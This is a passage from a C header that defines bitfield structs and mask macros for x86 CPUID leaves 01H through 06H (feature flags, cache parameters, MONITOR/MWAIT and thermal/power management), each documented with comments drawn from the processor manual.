#define CPUID_FEATURE_INFORMATION_EDX_SELF_SNOOP_BIT 27
#define CPUID_FEATURE_INFORMATION_EDX_SELF_SNOOP_FLAG 0x8000000
#define CPUID_FEATURE_INFORMATION_EDX_SELF_SNOOP_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_SELF_SNOOP(_) (((_) >> 27) & 0x01)

      /**
       * @brief Max APIC IDs reserved field is Valid
       *
       * [Bit 28] A value of 0 for HTT indicates there is only a single logical processor in the
       * package and software should assume only a single APIC ID is reserved. A value of 1 for HTT
       * indicates the value in CPUID.1.EBX[23:16] (the Maximum number of addressable IDs for
       * logical processors in this package) is valid for the package.
       */
      UINT32 HyperThreadingTechnology : 1;
#define CPUID_FEATURE_INFORMATION_EDX_HYPER_THREADING_TECHNOLOGY_BIT 28
#define CPUID_FEATURE_INFORMATION_EDX_HYPER_THREADING_TECHNOLOGY_FLAG 0x10000000
#define CPUID_FEATURE_INFORMATION_EDX_HYPER_THREADING_TECHNOLOGY_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_HYPER_THREADING_TECHNOLOGY(_) (((_) >> 28) & 0x01)

      /**
       * @brief Thermal Monitor
       *
       * [Bit 29] The processor implements the thermal monitor automatic thermal control circuitry
       * (TCC).
       */
      UINT32 ThermalMonitor : 1;
#define CPUID_FEATURE_INFORMATION_EDX_THERMAL_MONITOR_BIT 29
#define CPUID_FEATURE_INFORMATION_EDX_THERMAL_MONITOR_FLAG 0x20000000
#define CPUID_FEATURE_INFORMATION_EDX_THERMAL_MONITOR_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_THERMAL_MONITOR(_) (((_) >> 29) & 0x01)
      UINT32 Reserved3 : 1;

      /**
       * @brief Pending Break Enable
       *
       * [Bit 31] The processor supports the use of the FERR\#/PBE\# pin when the processor is in
       * the stop-clock state (STPCLK\# is asserted) to signal the processor that an interrupt is
       * pending and that the processor should return to normal operation to handle the interrupt.
       * Bit 10 (PBE enable) in the IA32_MISC_ENABLE MSR enables this capability.
       */
      UINT32 PendingBreakEnable : 1;
#define CPUID_FEATURE_INFORMATION_EDX_PENDING_BREAK_ENABLE_BIT 31
#define CPUID_FEATURE_INFORMATION_EDX_PENDING_BREAK_ENABLE_FLAG 0x80000000
#define CPUID_FEATURE_INFORMATION_EDX_PENDING_BREAK_ENABLE_MASK 0x01
#define CPUID_FEATURE_INFORMATION_EDX_PENDING_BREAK_ENABLE(_) (((_) >> 31) & 0x01)
    };

    UINT32 Flags;
  } CpuidFeatureInformationEdx;

} CPUID_EAX_01;

/**
 * @brief Deterministic Cache Parameters Leaf
 *
 * When CPUID executes with EAX set to 04H and ECX contains an index value, the processor returns
 * encoded data that describe a set of deterministic cache parameters (for the cache level
 * associated with the input in ECX). Valid index values start from 0. Software can enumerate the
 * deterministic cache parameters for each level of the cache hierarchy starting with an index value
 * of 0, until the parameters report the value associated with the cache type field is 0. The
 * architecturally defined fields reported by deterministic cache parameters are documented in Table
 * 3-8. This Cache Size in Bytes
 * - = (Ways + 1) * (Partitions + 1) * (Line_Size + 1) * (Sets + 1)
 * - = (EBX[31:22] + 1) * (EBX[21:12] + 1) * (EBX[11:0] + 1) * (ECX + 1)
 * The CPUID leaf 04H also reports data that can be used to derive the topology of processor cores
 * in a physical package. This information is constant for all valid index values. Software can
 * query the raw data reported by executing CPUID with EAX=04H and ECX=0 and use it as part of the
 * topology enumeration algorithm.
 *
 * @see Vol3A[8(Multiple-Processor Management)]
 */
#define CPUID_CACHE_PARAMETERS 0x00000004
typedef struct {
  union {
    struct {
      /**
       * [Bits 4:0] - 0 = Null - No more caches.
       * - 1 = Data Cache.
       * - 2 = Instruction Cache.
       * - 3 = Unified Cache.
       * - 4-31 = Reserved.
       */
      UINT32 CacheTypeField : 5;
#define CPUID_EAX_CACHE_TYPE_FIELD_BIT 0
#define CPUID_EAX_CACHE_TYPE_FIELD_FLAG 0x1F
#define CPUID_EAX_CACHE_TYPE_FIELD_MASK 0x1F
#define CPUID_EAX_CACHE_TYPE_FIELD(_) (((_) >> 0) & 0x1F)

      /**
       * [Bits 7:5] Cache Level (starts at 1).
       */
      UINT32 CacheLevel : 3;
#define CPUID_EAX_CACHE_LEVEL_BIT 5
#define CPUID_EAX_CACHE_LEVEL_FLAG 0xE0
#define CPUID_EAX_CACHE_LEVEL_MASK 0x07
#define CPUID_EAX_CACHE_LEVEL(_) (((_) >> 5) & 0x07)

      /**
       * [Bit 8] Self Initializing cache level (does not need SW initialization).
       */
      UINT32 SelfInitializingCacheLevel : 1;
#define CPUID_EAX_SELF_INITIALIZING_CACHE_LEVEL_BIT 8
#define CPUID_EAX_SELF_INITIALIZING_CACHE_LEVEL_FLAG 0x100
#define CPUID_EAX_SELF_INITIALIZING_CACHE_LEVEL_MASK 0x01
#define CPUID_EAX_SELF_INITIALIZING_CACHE_LEVEL(_) (((_) >> 8) & 0x01)

      /**
       * [Bit 9] Fully Associative cache.
       */
      UINT32 FullyAssociativeCache : 1;
#define CPUID_EAX_FULLY_ASSOCIATIVE_CACHE_BIT 9
#define CPUID_EAX_FULLY_ASSOCIATIVE_CACHE_FLAG 0x200
#define CPUID_EAX_FULLY_ASSOCIATIVE_CACHE_MASK 0x01
#define CPUID_EAX_FULLY_ASSOCIATIVE_CACHE(_) (((_) >> 9) & 0x01)
      UINT32 Reserved1 : 4;

      /**
       * [Bits 25:14] Maximum number of addressable IDs for logical processors sharing this cache.
       *
       * @note Add one to the return value to get the result.
       *       The nearest power-of-2 integer that is not smaller than (1 + EAX[25:14]) is the
       * number of unique initial APIC IDs reserved for addressing different logical processors
       * sharing this cache.
       */
      UINT32 MaxAddressableIdsForLogicalProcessorsSharingThisCache : 12;
#define CPUID_EAX_MAX_ADDRESSABLE_IDS_FOR_LOGICAL_PROCESSORS_SHARING_THIS_CACHE_BIT 14
#define CPUID_EAX_MAX_ADDRESSABLE_IDS_FOR_LOGICAL_PROCESSORS_SHARING_THIS_CACHE_FLAG 0x3FFC000
#define CPUID_EAX_MAX_ADDRESSABLE_IDS_FOR_LOGICAL_PROCESSORS_SHARING_THIS_CACHE_MASK 0xFFF
#define CPUID_EAX_MAX_ADDRESSABLE_IDS_FOR_LOGICAL_PROCESSORS_SHARING_THIS_CACHE(_) \
  (((_) >> 14) & 0xFFF)

      /**
       * [Bits 31:26] Maximum number of addressable IDs for processor cores in the physical package.
       *
       * @note Add one to the return value to get the result.
       *       The nearest power-of-2 integer that is not smaller than (1 + EAX[31:26]) is the
       * number of unique Core_IDs reserved for addressing different processor cores in a physical
       * package. Core ID is a subset of bits of the initial APIC ID. The returned value is constant
       * for valid initial values in ECX. Valid ECX values start from 0.
       */
      UINT32 MaxAddressableIdsForProcessorCoresInPhysicalPackage : 6;
#define CPUID_EAX_MAX_ADDRESSABLE_IDS_FOR_PROCESSOR_CORES_IN_PHYSICAL_PACKAGE_BIT 26
#define CPUID_EAX_MAX_ADDRESSABLE_IDS_FOR_PROCESSOR_CORES_IN_PHYSICAL_PACKAGE_FLAG 0xFC000000
#define CPUID_EAX_MAX_ADDRESSABLE_IDS_FOR_PROCESSOR_CORES_IN_PHYSICAL_PACKAGE_MASK 0x3F
#define CPUID_EAX_MAX_ADDRESSABLE_IDS_FOR_PROCESSOR_CORES_IN_PHYSICAL_PACKAGE(_) \
  (((_) >> 26) & 0x3F)
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bits 11:0] System Coherency Line Size.
       *
       * @note Add one to the return value to get the result.
       */
      UINT32 SystemCoherencyLineSize : 12;
#define CPUID_EBX_SYSTEM_COHERENCY_LINE_SIZE_BIT 0
#define CPUID_EBX_SYSTEM_COHERENCY_LINE_SIZE_FLAG 0xFFF
#define CPUID_EBX_SYSTEM_COHERENCY_LINE_SIZE_MASK 0xFFF
#define CPUID_EBX_SYSTEM_COHERENCY_LINE_SIZE(_) (((_) >> 0) & 0xFFF)

      /**
       * [Bits 21:12] Physical Line partitions.
       *
       * @note Add one to the return value to get the result.
       */
      UINT32 PhysicalLinePartitions : 10;
#define CPUID_EBX_PHYSICAL_LINE_PARTITIONS_BIT 12
#define CPUID_EBX_PHYSICAL_LINE_PARTITIONS_FLAG 0x3FF000
#define CPUID_EBX_PHYSICAL_LINE_PARTITIONS_MASK 0x3FF
#define CPUID_EBX_PHYSICAL_LINE_PARTITIONS(_) (((_) >> 12) & 0x3FF)

      /**
       * [Bits 31:22] Ways of associativity.
       *
       * @note Add one to the return value to get the result.
       */
      UINT32 WaysOfAssociativity : 10;
#define CPUID_EBX_WAYS_OF_ASSOCIATIVITY_BIT 22
#define CPUID_EBX_WAYS_OF_ASSOCIATIVITY_FLAG 0xFFC00000
#define CPUID_EBX_WAYS_OF_ASSOCIATIVITY_MASK 0x3FF
#define CPUID_EBX_WAYS_OF_ASSOCIATIVITY(_) (((_) >> 22) & 0x3FF)
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bits 31:0] Number of Sets.
       *
       * @note Add one to the return value to get the result.
       */
      UINT32 NumberOfSets : 32;
#define CPUID_ECX_NUMBER_OF_SETS_BIT 0
#define CPUID_ECX_NUMBER_OF_SETS_FLAG 0xFFFFFFFF
#define CPUID_ECX_NUMBER_OF_SETS_MASK 0xFFFFFFFF
#define CPUID_ECX_NUMBER_OF_SETS(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      /**
       * @brief Write-Back Invalidate/Invalidate
       *
       * [Bit 0] - 0 = WBINVD/INVD from threads sharing this cache acts upon lower level caches for
       * threads sharing this cache.
       * - 1 = WBINVD/INVD is not guaranteed to act upon lower level caches of non-originating
       * threads sharing this cache.
       */
      UINT32 WriteBackInvalidate : 1;
#define CPUID_EDX_WRITE_BACK_INVALIDATE_BIT 0
#define CPUID_EDX_WRITE_BACK_INVALIDATE_FLAG 0x01
#define CPUID_EDX_WRITE_BACK_INVALIDATE_MASK 0x01
#define CPUID_EDX_WRITE_BACK_INVALIDATE(_) (((_) >> 0) & 0x01)

      /**
       * @brief Cache Inclusiveness
       *
       * [Bit 1] - 0 = Cache is not inclusive of lower cache levels.
       * - 1 = Cache is inclusive of lower cache levels.
       */
      UINT32 CacheInclusiveness : 1;
#define CPUID_EDX_CACHE_INCLUSIVENESS_BIT 1
#define CPUID_EDX_CACHE_INCLUSIVENESS_FLAG 0x02
#define CPUID_EDX_CACHE_INCLUSIVENESS_MASK 0x01
#define CPUID_EDX_CACHE_INCLUSIVENESS(_) (((_) >> 1) & 0x01)

      /**
       * @brief Complex Cache Indexing
       *
       * [Bit 2] - 0 = Direct mapped cache.
       * - 1 = A complex function is used to index the cache, potentially using all address bits.
       */
      UINT32 ComplexCacheIndexing : 1;
#define CPUID_EDX_COMPLEX_CACHE_INDEXING_BIT 2
#define CPUID_EDX_COMPLEX_CACHE_INDEXING_FLAG 0x04
#define CPUID_EDX_COMPLEX_CACHE_INDEXING_MASK 0x01
#define CPUID_EDX_COMPLEX_CACHE_INDEXING(_) (((_) >> 2) & 0x01)
      UINT32 Reserved1 : 29;
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_04;

/**
 * @brief MONITOR/MWAIT Leaf
 *
 * When CPUID executes with EAX set to 05H, the processor returns information about features
 * available to MONITOR/MWAIT instructions. The MONITOR instruction is used for address-range
 * monitoring in conjunction with MWAIT instruction. The MWAIT instruction optionally provides
 * additional extensions for advanced power management.
 */
#define CPUID_MONITOR_MWAIT 0x00000005
typedef struct {
  union {
    struct {
      /**
       * [Bits 15:0] Smallest monitor-line size in bytes (default is processor's monitor
       * granularity).
       */
      UINT32 SmallestMonitorLineSize : 16;
#define CPUID_EAX_SMALLEST_MONITOR_LINE_SIZE_BIT 0
#define CPUID_EAX_SMALLEST_MONITOR_LINE_SIZE_FLAG 0xFFFF
#define CPUID_EAX_SMALLEST_MONITOR_LINE_SIZE_MASK 0xFFFF
#define CPUID_EAX_SMALLEST_MONITOR_LINE_SIZE(_) (((_) >> 0) & 0xFFFF)
      UINT32 Reserved1 : 16;
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bits 15:0] Largest monitor-line size in bytes (default is processor's monitor
       * granularity).
       */
      UINT32 LargestMonitorLineSize : 16;
#define CPUID_EBX_LARGEST_MONITOR_LINE_SIZE_BIT 0
#define CPUID_EBX_LARGEST_MONITOR_LINE_SIZE_FLAG 0xFFFF
#define CPUID_EBX_LARGEST_MONITOR_LINE_SIZE_MASK 0xFFFF
#define CPUID_EBX_LARGEST_MONITOR_LINE_SIZE(_) (((_) >> 0) & 0xFFFF)
      UINT32 Reserved1 : 16;
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bit 0] Enumeration of Monitor-Mwait extensions (beyond EAX and EBX registers) supported.
       */
      UINT32 EnumerationOfMonitorMwaitExtensions : 1;
#define CPUID_ECX_ENUMERATION_OF_MONITOR_MWAIT_EXTENSIONS_BIT 0
#define CPUID_ECX_ENUMERATION_OF_MONITOR_MWAIT_EXTENSIONS_FLAG 0x01
#define CPUID_ECX_ENUMERATION_OF_MONITOR_MWAIT_EXTENSIONS_MASK 0x01
#define CPUID_ECX_ENUMERATION_OF_MONITOR_MWAIT_EXTENSIONS(_) (((_) >> 0) & 0x01)

      /**
       * [Bit 1] Supports treating interrupts as break-event for MWAIT, even when interrupts
       * disabled.
       */
      UINT32 SupportsTreatingInterruptsAsBreakEventForMwait : 1;
#define CPUID_ECX_SUPPORTS_TREATING_INTERRUPTS_AS_BREAK_EVENT_FOR_MWAIT_BIT 1
#define CPUID_ECX_SUPPORTS_TREATING_INTERRUPTS_AS_BREAK_EVENT_FOR_MWAIT_FLAG 0x02
#define CPUID_ECX_SUPPORTS_TREATING_INTERRUPTS_AS_BREAK_EVENT_FOR_MWAIT_MASK 0x01
#define CPUID_ECX_SUPPORTS_TREATING_INTERRUPTS_AS_BREAK_EVENT_FOR_MWAIT(_) (((_) >> 1) & 0x01)
      UINT32 Reserved1 : 30;
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      /**
       * [Bits 3:0] Number of C0 sub C-states supported using MWAIT.
       */
      UINT32 NumberOfC0SubCStates : 4;
#define CPUID_EDX_NUMBER_OF_C0_SUB_C_STATES_BIT 0
#define CPUID_EDX_NUMBER_OF_C0_SUB_C_STATES_FLAG 0x0F
#define CPUID_EDX_NUMBER_OF_C0_SUB_C_STATES_MASK 0x0F
#define CPUID_EDX_NUMBER_OF_C0_SUB_C_STATES(_) (((_) >> 0) & 0x0F)

      /**
       * [Bits 7:4] Number of C1 sub C-states supported using MWAIT.
       */
      UINT32 NumberOfC1SubCStates : 4;
#define CPUID_EDX_NUMBER_OF_C1_SUB_C_STATES_BIT 4
#define CPUID_EDX_NUMBER_OF_C1_SUB_C_STATES_FLAG 0xF0
#define CPUID_EDX_NUMBER_OF_C1_SUB_C_STATES_MASK 0x0F
#define CPUID_EDX_NUMBER_OF_C1_SUB_C_STATES(_) (((_) >> 4) & 0x0F)

      /**
       * [Bits 11:8] Number of C2 sub C-states supported using MWAIT.
       */
      UINT32 NumberOfC2SubCStates : 4;
#define CPUID_EDX_NUMBER_OF_C2_SUB_C_STATES_BIT 8
#define CPUID_EDX_NUMBER_OF_C2_SUB_C_STATES_FLAG 0xF00
#define CPUID_EDX_NUMBER_OF_C2_SUB_C_STATES_MASK 0x0F
#define CPUID_EDX_NUMBER_OF_C2_SUB_C_STATES(_) (((_) >> 8) & 0x0F)

      /**
       * [Bits 15:12] Number of C3 sub C-states supported using MWAIT.
       */
      UINT32 NumberOfC3SubCStates : 4;
#define CPUID_EDX_NUMBER_OF_C3_SUB_C_STATES_BIT 12
#define CPUID_EDX_NUMBER_OF_C3_SUB_C_STATES_FLAG 0xF000
#define CPUID_EDX_NUMBER_OF_C3_SUB_C_STATES_MASK 0x0F
#define CPUID_EDX_NUMBER_OF_C3_SUB_C_STATES(_) (((_) >> 12) & 0x0F)

      /**
       * [Bits 19:16] Number of C4 sub C-states supported using MWAIT.
       */
      UINT32 NumberOfC4SubCStates : 4;
#define CPUID_EDX_NUMBER_OF_C4_SUB_C_STATES_BIT 16
#define CPUID_EDX_NUMBER_OF_C4_SUB_C_STATES_FLAG 0xF0000
#define CPUID_EDX_NUMBER_OF_C4_SUB_C_STATES_MASK 0x0F
#define CPUID_EDX_NUMBER_OF_C4_SUB_C_STATES(_) (((_) >> 16) & 0x0F)

      /**
       * [Bits 23:20] Number of C5 sub C-states supported using MWAIT.
       */
      UINT32 NumberOfC5SubCStates : 4;
#define CPUID_EDX_NUMBER_OF_C5_SUB_C_STATES_BIT 20
#define CPUID_EDX_NUMBER_OF_C5_SUB_C_STATES_FLAG 0xF00000
#define CPUID_EDX_NUMBER_OF_C5_SUB_C_STATES_MASK 0x0F
#define CPUID_EDX_NUMBER_OF_C5_SUB_C_STATES(_) (((_) >> 20) & 0x0F)

      /**
       * [Bits 27:24] Number of C6 sub C-states supported using MWAIT.
       */
      UINT32 NumberOfC6SubCStates : 4;
#define CPUID_EDX_NUMBER_OF_C6_SUB_C_STATES_BIT 24
#define CPUID_EDX_NUMBER_OF_C6_SUB_C_STATES_FLAG 0xF000000
#define CPUID_EDX_NUMBER_OF_C6_SUB_C_STATES_MASK 0x0F
#define CPUID_EDX_NUMBER_OF_C6_SUB_C_STATES(_) (((_) >> 24) & 0x0F)

      /**
       * [Bits 31:28] Number of C7 sub C-states supported using MWAIT.
       */
      UINT32 NumberOfC7SubCStates : 4;
#define CPUID_EDX_NUMBER_OF_C7_SUB_C_STATES_BIT 28
#define CPUID_EDX_NUMBER_OF_C7_SUB_C_STATES_FLAG 0xF0000000
#define CPUID_EDX_NUMBER_OF_C7_SUB_C_STATES_MASK 0x0F
#define CPUID_EDX_NUMBER_OF_C7_SUB_C_STATES(_) (((_) >> 28) & 0x0F)
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_05;

/**
 * @brief Thermal and Power Management Leaf
 *
 * When CPUID executes with EAX set to 06H, the processor returns information about thermal and
 * power management features.
 */
#define CPUID_THERMAL_AND_POWER_MANAGEMENT 0x00000006
typedef struct {
  union {
    struct {
      /**
       * [Bit 0] Digital temperature sensor is supported if set.
       */
      UINT32 TemperatureSensorSupported : 1;
#define CPUID_EAX_TEMPERATURE_SENSOR_SUPPORTED_BIT 0
#define CPUID_EAX_TEMPERATURE_SENSOR_SUPPORTED_FLAG 0x01
#define CPUID_EAX_TEMPERATURE_SENSOR_SUPPORTED_MASK 0x01
#define CPUID_EAX_TEMPERATURE_SENSOR_SUPPORTED(_) (((_) >> 0) & 0x01)

      /**
       * [Bit 1] Intel Turbo Boost Technology available (see description of IA32_MISC_ENABLE[38]).
       */
      UINT32 IntelTurboBoostTechnologyAvailable : 1;
#define CPUID_EAX_INTEL_TURBO_BOOST_TECHNOLOGY_AVAILABLE_BIT 1
#define CPUID_EAX_INTEL_TURBO_BOOST_TECHNOLOGY_AVAILABLE_FLAG 0x02
#define CPUID_EAX_INTEL_TURBO_BOOST_TECHNOLOGY_AVAILABLE_MASK 0x01
#define CPUID_EAX_INTEL_TURBO_BOOST_TECHNOLOGY_AVAILABLE(_) (((_) >> 1) & 0x01)

      /**
       * [Bit 2] ARAT. APIC-Timer-always-running feature is supported if set.
       */
      UINT32 ApicTimerAlwaysRunning : 1;
#define CPUID_EAX_APIC_TIMER_ALWAYS_RUNNING_BIT 2
#define CPUID_EAX_APIC_TIMER_ALWAYS_RUNNING_FLAG 0x04
#define CPUID_EAX_APIC_TIMER_ALWAYS_RUNNING_MASK 0x01
#define CPUID_EAX_APIC_TIMER_ALWAYS_RUNNING(_) (((_) >> 2) & 0x01)
      UINT32 Reserved1 : 1;

      /**
       * [Bit 4] PLN. Power limit notification controls are supported if set.
       */
      UINT32 PowerLimitNotification : 1;
#define CPUID_EAX_POWER_LIMIT_NOTIFICATION_BIT 4
#define CPUID_EAX_POWER_LIMIT_NOTIFICATION_FLAG 0x10
#define CPUID_EAX_POWER_LIMIT_NOTIFICATION_MASK 0x01
#define CPUID_EAX_POWER_LIMIT_NOTIFICATION(_) (((_) >> 4) & 0x01)

      /**
       * [Bit 5] ECMD. Clock modulation duty cycle extension is supported if set.
       */
      UINT32 ClockModulationDuty : 1;
#define CPUID_EAX_CLOCK_MODULATION_DUTY_BIT 5
#define CPUID_EAX_CLOCK_MODULATION_DUTY_FLAG 0x20
#define CPUID_EAX_CLOCK_MODULATION_DUTY_MASK 0x01
#define CPUID_EAX_CLOCK_MODULATION_DUTY(_) (((_) >> 5) & 0x01)

      /**
       * [Bit 6] PTM. Package thermal management is supported if set.
       */
      UINT32 PackageThermalManagement : 1;
#define CPUID_EAX_PACKAGE_THERMAL_MANAGEMENT_BIT 6
#define CPUID_EAX_PACKAGE_THERMAL_MANAGEMENT_FLAG 0x40
#define CPUID_EAX_PACKAGE_THERMAL_MANAGEMENT_MASK 0x01
#define CPUID_EAX_PACKAGE_THERMAL_MANAGEMENT(_) (((_) >> 6) & 0x01)

      /**
       * [Bit 7] HWP. HWP base registers (IA32_PM_ENABLE[bit 0], IA32_HWP_CAPABILITIES,
       * IA32_HWP_REQUEST, IA32_HWP_STATUS) are supported if set.
       */
      UINT32 HwpBaseRegisters : 1;
#define CPUID_EAX_HWP_BASE_REGISTERS_BIT 7
#define CPUID_EAX_HWP_BASE_REGISTERS_FLAG 0x80
#define CPUID_EAX_HWP_BASE_REGISTERS_MASK 0x01
#define CPUID_EAX_HWP_BASE_REGISTERS(_) (((_) >> 7) & 0x01)

      /**
       * [Bit 8] HWP_Notification. IA32_HWP_INTERRUPT MSR is supported if set.
       */
      UINT32 HwpNotification : 1;
#define CPUID_EAX_HWP_NOTIFICATION_BIT 8
#define CPUID_EAX_HWP_NOTIFICATION_FLAG 0x100
#define CPUID_EAX_HWP_NOTIFICATION_MASK 0x01
#define CPUID_EAX_HWP_NOTIFICATION(_) (((_) >> 8) & 0x01)

      /**
       * [Bit 9] HWP_Activity_Window. IA32_HWP_REQUEST[bits 41:32] is supported if set.
       */
      UINT32 HwpActivityWindow : 1;
#define CPUID_EAX_HWP_ACTIVITY_WINDOW_BIT 9
#define CPUID_EAX_HWP_ACTIVITY_WINDOW_FLAG 0x200
#define CPUID_EAX_HWP_ACTIVITY_WINDOW_MASK 0x01
#define CPUID_EAX_HWP_ACTIVITY_WINDOW(_) (((_) >> 9) & 0x01)

      /**
       * [Bit 10] HWP_Energy_Performance_Preference. IA32_HWP_REQUEST[bits 31:24] is supported if
       * set.
       */
      UINT32 HwpEnergyPerformancePreference : 1;
#define CPUID_EAX_HWP_ENERGY_PERFORMANCE_PREFERENCE_BIT 10
#define CPUID_EAX_HWP_ENERGY_PERFORMANCE_PREFERENCE_FLAG 0x400
#define CPUID_EAX_HWP_ENERGY_PERFORMANCE_PREFERENCE_MASK 0x01
#define CPUID_EAX_HWP_ENERGY_PERFORMANCE_PREFERENCE(_) (((_) >> 10) & 0x01)

      /**
       * [Bit 11] HWP_Package_Level_Request. IA32_HWP_REQUEST_PKG MSR is supported if set.
       */
      UINT32 HwpPackageLevelRequest : 1;
#define CPUID_EAX_HWP_PACKAGE_LEVEL_REQUEST_BIT 11
#define CPUID_EAX_HWP_PACKAGE_LEVEL_REQUEST_FLAG 0x800
#define CPUID_EAX_HWP_PACKAGE_LEVEL_REQUEST_MASK 0x01
#define CPUID_EAX_HWP_PACKAGE_LEVEL_REQUEST(_) (((_) >> 11) & 0x01)
      UINT32 Reserved2 : 1;

      /**
       * [Bit 13] HDC. HDC base registers IA32_PKG_HDC_CTL, IA32_PM_CTL1, IA32_THREAD_STALL MSRs are
       * supported if set.
       */
      UINT32 Hdc : 1;
#define CPUID_EAX_HDC_BIT 13
#define CPUID_EAX_HDC_FLAG 0x2000
#define CPUID_EAX_HDC_MASK 0x01
#define CPUID_EAX_HDC(_) (((_) >> 13) & 0x01)

      /**
       * [Bit 14] Intel(R) Turbo Boost Max Technology 3.0 available.
       */
      UINT32 IntelTurboBoostMaxTechnology3Available : 1;
#define CPUID_EAX_INTEL_TURBO_BOOST_MAX_TECHNOLOGY_3_AVAILABLE_BIT 14
#define CPUID_EAX_INTEL_TURBO_BOOST_MAX_TECHNOLOGY_3_AVAILABLE_FLAG 0x4000
#define CPUID_EAX_INTEL_TURBO_BOOST_MAX_TECHNOLOGY_3_AVAILABLE_MASK 0x01
#define CPUID_EAX_INTEL_TURBO_BOOST_MAX_TECHNOLOGY_3_AVAILABLE(_) (((_) >> 14) & 0x01)

      /**
       * [Bit 15] HWP Capabilities. Highest Performance change is supported if set.
       */
      UINT32 HwpCapabilities : 1;
#define CPUID_EAX_HWP_CAPABILITIES_BIT 15
#define CPUID_EAX_HWP_CAPABILITIES_FLAG 0x8000
#define CPUID_EAX_HWP_CAPABILITIES_MASK 0x01
#define CPUID_EAX_HWP_CAPABILITIES(_) (((_) >> 15) & 0x01)

      /**
       * [Bit 16] HWP PECI override is supported if set.
       */
      UINT32 HwpPeciOverride : 1;
#define CPUID_EAX_HWP_PECI_OVERRIDE_BIT 16
#define CPUID_EAX_HWP_PECI_OVERRIDE_FLAG 0x10000
#define CPUID_EAX_HWP_PECI_OVERRIDE_MASK 0x01
#define CPUID_EAX_HWP_PECI_OVERRIDE(_) (((_) >> 16) & 0x01)

      /**
       * [Bit 17] Flexible HWP is supported if set.
       */
      UINT32 FlexibleHwp : 1;
#define CPUID_EAX_FLEXIBLE_HWP_BIT 17
#define CPUID_EAX_FLEXIBLE_HWP_FLAG 0x20000
#define CPUID_EAX_FLEXIBLE_HWP_MASK 0x01
#define CPUID_EAX_FLEXIBLE_HWP(_) (((_) >> 17) & 0x01)

      /**
       * [Bit 18] Fast access mode for the IA32_HWP_REQUEST MSR is supported if set.
       */
      UINT32 FastAccessModeForHwpRequestMsr : 1;
#define CPUID_EAX_FAST_ACCESS_MODE_FOR_HWP_REQUEST_MSR_BIT 18
#define CPUID_EAX_FAST_ACCESS_MODE_FOR_HWP_REQUEST_MSR_FLAG 0x40000
#define CPUID_EAX_FAST_ACCESS_MODE_FOR_HWP_REQUEST_MSR_MASK 0x01
#define CPUID_EAX_FAST_ACCESS_MODE_FOR_HWP_REQUEST_MSR(_) (((_) >> 18) & 0x01)
      UINT32 Reserved3 : 1;

      /**
       * [Bit 20] Ignoring Idle Logical Processor HWP request is supported if set.
       */
      UINT32 IgnoringIdleLogicalProcessorHwpRequest : 1;
#define CPUID_EAX_IGNORING_IDLE_LOGICAL_PROCESSOR_HWP_REQUEST_BIT 20
#define CPUID_EAX_IGNORING_IDLE_LOGICAL_PROCESSOR_HWP_REQUEST_FLAG 0x100000
#define CPUID_EAX_IGNORING_IDLE_LOGICAL_PROCESSOR_HWP_REQUEST_MASK 0x01
#define CPUID_EAX_IGNORING_IDLE_LOGICAL_PROCESSOR_HWP_REQUEST(_) (((_) >> 20) & 0x01)
      UINT32 Reserved4 : 11;
    };

    UINT32 Flags;
  } Eax;

  union {
    struct {
      /**
       * [Bits 3:0] Number of Interrupt Thresholds in Digital Thermal Sensor.
       */
      UINT32 NumberOfInterruptThresholdsInThermalSensor : 4;
#define CPUID_EBX_NUMBER_OF_INTERRUPT_THRESHOLDS_IN_THERMAL_SENSOR_BIT 0
#define CPUID_EBX_NUMBER_OF_INTERRUPT_THRESHOLDS_IN_THERMAL_SENSOR_FLAG 0x0F
#define CPUID_EBX_NUMBER_OF_INTERRUPT_THRESHOLDS_IN_THERMAL_SENSOR_MASK 0x0F
#define CPUID_EBX_NUMBER_OF_INTERRUPT_THRESHOLDS_IN_THERMAL_SENSOR(_) (((_) >> 0) & 0x0F)
      UINT32 Reserved1 : 28;
    };

    UINT32 Flags;
  } Ebx;

  union {
    struct {
      /**
       * [Bit 0] Hardware Coordination Feedback Capability (Presence of IA32_MPERF and IA32_APERF).
       * The capability to provide a measure of delivered processor performance (since last reset of
       * the counters), as a percentage of the expected processor performance when running at the
       * TSC frequency.
       */
      UINT32 HardwareCoordinationFeedbackCapability : 1;
#define CPUID_ECX_HARDWARE_COORDINATION_FEEDBACK_CAPABILITY_BIT 0
#define CPUID_ECX_HARDWARE_COORDINATION_FEEDBACK_CAPABILITY_FLAG 0x01
#define CPUID_ECX_HARDWARE_COORDINATION_FEEDBACK_CAPABILITY_MASK 0x01
#define CPUID_ECX_HARDWARE_COORDINATION_FEEDBACK_CAPABILITY(_) (((_) >> 0) & 0x01)
      UINT32 Reserved1 : 2;

      /**
       * [Bit 3] The processor supports performance-energy bias preference if
       * CPUID.06H:ECX.SETBH[bit 3] is set and it also implies the presence of a new architectural
       * MSR called IA32_ENERGY_PERF_BIAS (1B0H).
       */
      UINT32 PerformanceEnergyBiasPreference : 1;
#define CPUID_ECX_PERFORMANCE_ENERGY_BIAS_PREFERENCE_BIT 3
#define CPUID_ECX_PERFORMANCE_ENERGY_BIAS_PREFERENCE_FLAG 0x08
#define CPUID_ECX_PERFORMANCE_ENERGY_BIAS_PREFERENCE_MASK 0x01
#define CPUID_ECX_PERFORMANCE_ENERGY_BIAS_PREFERENCE(_) (((_) >> 3) & 0x01)
      UINT32 Reserved2 : 28;
    };

    UINT32 Flags;
  } Ecx;

  union {
    struct {
      /**
       * [Bits 31:0] EDX is reserved.
       */
      UINT32 Reserved : 32;
#define CPUID_EDX_RESERVED_BIT 0
#define CPUID_EDX_RESERVED_FLAG 0xFFFFFFFF
#define CPUID_EDX_RESERVED_MASK 0xFFFFFFFF
#define CPUID_EDX_RESERVED(_) (((_) >> 0) & 0xFFFFFFFF)
    };

    UINT32 Flags;
  } Edx;

} CPUID_EAX_06;

/**
 * @brief Structured Extended Feature Flags Enumeration Leaf (Output depends on ECX input value)
 *
